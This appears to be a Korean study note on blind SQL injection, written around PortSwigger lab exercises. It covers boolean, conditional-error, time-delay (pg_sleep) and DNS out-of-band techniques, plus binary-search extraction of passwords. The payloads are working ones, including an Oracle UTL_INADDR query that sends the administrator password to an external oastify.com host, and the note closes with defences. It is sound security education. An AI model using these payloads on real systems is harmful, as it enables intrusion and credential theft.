---
title: 블라인드 SQL 인젝션의 관찰 신호와 데이터 추론
category: sql-injection
category_title: SQL 인젝션
tags: [SQL, SQL 인젝션, 블라인드 SQL 인젝션, DNS]
note_kind: note
---

# 블라인드 SQL 인젝션의 관찰 신호와 데이터 추론

블라인드 SQL 인젝션에서는 주입한 조회의 결과가 웹 응답에 직접 표시되지 않는다. 그래도 **조회 조건이 참인지 거짓인지에 따라 관찰할 수 있는 변화**가 있으면 데이터를 조금씩 추론할 수 있다. 변화가 웹 응답에 없다면 데이터베이스가 만든 DNS 조회처럼 웹 응답 밖의 기록을 관찰할 수도 있다. 핵심은 페이로드를 길게 만드는 것이 아니라, 먼저 신뢰할 수 있는 판정 신호를 찾는 것이다. [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)

## 어떤 신호를 읽을 수 있나

| 관찰 위치 | 참·거짓 또는 데이터가 드러나는 방식 | 실습에서 확인한 예 |
| --- | --- | --- |
| 응답 본문 | 조회 결과에 따라 문구가 나타나거나 사라짐 | 참일 때 `Welcome back!` 표시 |
| HTTP 상태 | 조건이 참일 때만 SQL 오류를 내도록 함 | 참은 HTTP 500, 거짓은 HTTP 200 |
| 응답 시간 | 조건이 참일 때만 조회를 지연시킴 | PostgreSQL `pg_sleep(3)` 사용 |
| 외부 수신 기록 | 데이터베이스가 고유 도메인을 DNS로 조회함 | Oracle `UTL_INADDR.GET_HOST_ADDRESS` 사용 |

이들은 모두 같은 SQLi 취약점에서 **결과를 읽는 경로**가 다를 뿐이다. `UNION SELECT`가 문법적으로 성공하더라도 추가한 행이 화면에 표시되지 않으면 그 자체로 추출 경로가 되지 않는다. 반대로 오류 메시지가 조회한 값을 그대로 포함한다면, 더 이상 참·거짓을 반복해서 물을 필요 없이 그 값이 직접 보이는 오류 기반 방식이 된다. [표시되는 오류로 데이터 읽기 실습](../labs/sql-injection/blind-lab-sql-injection-visible-error-based.md), [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)

## 조건을 묻기 전에 신호부터 보정하기

1. 원래 요청을 저장하고 입력이 들어가는 위치를 확인한다. 실습에서는 주로 `TrackingId` 쿠키였다.
2. 확실히 참인 조건(`1=1`)과 거짓인 조건(`1=2`)을 각각 보내 응답 문구, 상태 코드, 본문, 시간을 대조한다.
3. 두 조건에서 반복해서 갈리는 관찰값만 판정 신호로 사용한다. 응답 길이가 같거나 두 요청 모두 200이라면 그 숫자만으로는 참·거짓을 읽을 수 없다.
4. DNS를 쓴다면 먼저 고정된 **고유 도메인**으로 조회가 오는지 시험하고, 수신 기록이 방금 보낸 요청에서 비롯됐는지 확인한다.

한 번의 타임아웃이나 느린 요청은 참 조건의 증거가 아니다. 지연 방식에서는 정상·참·거짓 요청을 번갈아 반복해 기준 시간을 잡아야 한다. 비동기식 SQL 조회라면 데이터베이스가 지연되어도 원래 웹 요청은 먼저 끝날 수 있으므로, 이때는 응답 시간 대신 외부 수신 기록을 본다.

또한 **클라이언트가 의도한 쿠키를 실제로 보냈는지** 확인한다. PowerShell의 `CookieContainer`는 쉼표 등이 든 주입 문자열을 거부할 수 있다. 이는 SQL 판정이 아니라 요청 생성 오류다. 실습에서는 SQL 값을 URL 인코딩해 `Cookie` 헤더에 담고 기존 세션 쿠키를 유지했다. 참·거짓 대조가 모두 같은 결과일 때는 이 전달 경로부터 다시 점검한다.

## 참·거짓 한 비트로 문자열 복원하기

문자열이 화면에 없더라도 `administrator`의 비밀번호에 대해 다음과 같은 질문을 만들 수 있다. 예시는 **Oracle의 문자열 함수와 한 행짜리 `dual` 테이블을 쓰는 실습 구문**이며, 다른 DB에는 문법을 맞춰야 한다.

```sql
(SELECT LENGTH(password) FROM users WHERE username='administrator') > 16

(SELECT ASCII(SUBSTR(password, 5, 1))
 FROM users WHERE username='administrator') > 115
```

첫 질문으로 길이의 범위를 좁히고, 두 번째 질문으로 5번째 문자의 코드를 좁힌다. 참이면 중간값보다 큰 쪽, 거짓이면 작거나 같은 쪽을 남기는 **이진 탐색**을 반복한다. 출력 가능한 ASCII 32~126을 후보로 정했다면 문자마다 최대 7번의 비교로 범위를 한 값까지 좁힐 수 있다. 이 범위는 실습의 영숫자 비밀번호에 맞춘 가정이다. 그 밖의 문자까지 가능하다면 후보 범위나 인코딩을 조정해야 한다.

추론한 길이와 문자열은 마지막에 전체 값이 일치하는지 다시 물어 검증한다. 조건식이 행을 반환하지 않거나 `NULL`이 되면 단순한 거짓과 구별하기 어려우므로, 먼저 대상 사용자가 실제로 존재하는지도 확인하는 편이 안전하다.

## 응답 문구와 조건부 오류

응답 문구 방식은 원래 `TrackingId` 뒤에 조건을 붙여, 조회가 행을 반환할 때만 `Welcome back!`이 표시되는지를 읽었다. 참·거짓 대조 후 같은 자리에 길이나 문자 비교식을 넣으면 된다. [조건부 응답 실습](../labs/sql-injection/blind-lab-conditional-responses.md)

문구가 변하지 않아도 오류가 HTTP 상태로 드러나면 **조건이 참일 때만 오류를 발생**시킬 수 있다. Oracle 실습에서는 다음 `CASE`의 참 가지에서 `1/0`을 계산하자 HTTP 500이, 거짓 가지에서는 HTTP 200이 나왔다.

```sql
<원래 TrackingId>' UNION SELECT CASE WHEN (<확인할 조건>)
  THEN TO_CHAR(1/0) ELSE 'x' END FROM dual-- -
```

`TO_CHAR`는 `CASE`의 두 결과를 문자열로 맞춘다. 어떤 상태가 참을 뜻하는지는 추측하지 않고 `1=1`과 `1=2`로 먼저 확인한다. [조건부 오류 실습](../labs/sql-injection/blind-lab-conditional-errors.md), [PortSwigger SQL 인젝션 치트시트](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## 응답 시간이 신호가 되는 조건

PostgreSQL 실습에서는 조회가 **동기식**으로 실행됐고, 참일 때 `pg_sleep(3)`, 거짓일 때 `pg_sleep(0)`을 실행했다. HTML과 상태 코드는 같았지만 참 요청이 약 3초 더 걸렸다.

```sql
<원래 TrackingId>'||(SELECT CASE WHEN (<확인할 조건>)
  THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

이 신호로 길이와 각 문자의 비교 결과를 읽을 수 있다. 다만 네트워크 지연과 서버 부하는 시간에 잡음을 더한다. 참·거짓 대조를 반복하고, 애매한 측정은 다시 확인한다. [지연 확인 실습](../labs/sql-injection/blind-lab-time-delays.md), [시간으로 정보 추출 실습](../labs/sql-injection/blind-lab-time-delays-info-retrieval.md)

## 웹 응답 밖으로 보내기: DNS

비동기식 조회에서는 SQL 결과·오류·실행 시간이 원래 응답에 영향을 주지 않을 수 있다. 이때 데이터베이스가 외부 도메인을 조회하도록 만들고, 그 **DNS 수신 기록**을 관찰한다. Oracle 실습에서는 `UTL_INADDR.GET_HOST_ADDRESS`의 인수로 고유 Collaborator 주소를 주자 DNS 이벤트가 도착했다. 함수의 본래 반환값은 IP 주소지만, 여기서 읽는 신호는 호스트 이름을 해석하는 과정이다. 네트워크 접근 권한이 없는 DB 계정에서는 이 방법이 실패할 수 있다. [Oracle `UTL_INADDR` 문서](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_INADDR.html)

```sql
<원래 TrackingId>' UNION SELECT
  UTL_INADDR.GET_HOST_ADDRESS('<고유값>.oastify.com')
FROM dual-- -
```

고정 도메인 조회는 **외부 상호작용이 가능하다는 증거**일 뿐이다. 값을 추출하려면 조회할 호스트 이름에 데이터베이스 값을 넣는다.

```sql
<원래 TrackingId>' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(
  (SELECT password FROM users WHERE username='administrator')
  || '.<고유값>.oastify.com'
) FROM dual-- -
```

실제 재시험에서 정상 요청과 주입 요청은 모두 HTTP 200, 본문 4,535바이트였다. Collaborator에는 `9cn0o3ivx864gu54gpjk.<고유값>.oastify.com`의 DNS 조회가 기록됐고, 맨 앞 레이블에서 비밀번호를 읽었다. 같은 호스트에 대한 이벤트가 여러 건 올 수 있으므로 **이벤트 수보다 조회된 이름**이 중요하다. DNS 이름에 넣을 값은 레이블 길이와 허용 문자에 맞아야 하며, 긴 값은 분할하거나 인코딩해야 한다. [DNS 조회 실습](../labs/sql-injection/blind-lab-out-of-band.md), [DNS 데이터 추출 실습](../labs/sql-injection/blind-lab-out-of-band-data-exfiltration.md)

수신용 주소를 직접 만들고 기록을 조회할 때는 주소에 대응하는 비밀값을 보관해야 한다. 주소가 조회되는 것과 **내가 그 주소의 수신 기록을 읽을 수 있는 것**은 별도 검증이다. [Burp Collaborator 공개 서버용 CLI 클라이언트 구현](burp-collaborator-cli-client.md)

## 작업 흐름과 방어

입력 위치 확인 → 참·거짓 대조 → 사용할 신호 결정 → 길이와 문자 비교 또는 외부 기록으로 값 확인 → 전체 값 검증 순서로 진행한다. DB마다 문자열 함수, 오류 식, 지연 함수와 네트워크 권한이 다르므로 한 실습에서 된 구문을 다른 실습에 그대로 쓰지 않는다.

방어는 관찰 신호를 숨기는 데서 끝나지 않는다. 사용자 입력을 SQL 문자열에 이어 붙이지 않고 **매개변수화 쿼리의 값**으로 전달해야 한다. 데이터베이스 계정의 권한을 필요한 범위로 제한하고, 상세 오류나 불필요한 외부 네트워크 접근도 줄인다. [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), [SQL 기초와 SQL 인젝션이 생기는 원리](sql-injection-foundations.md)
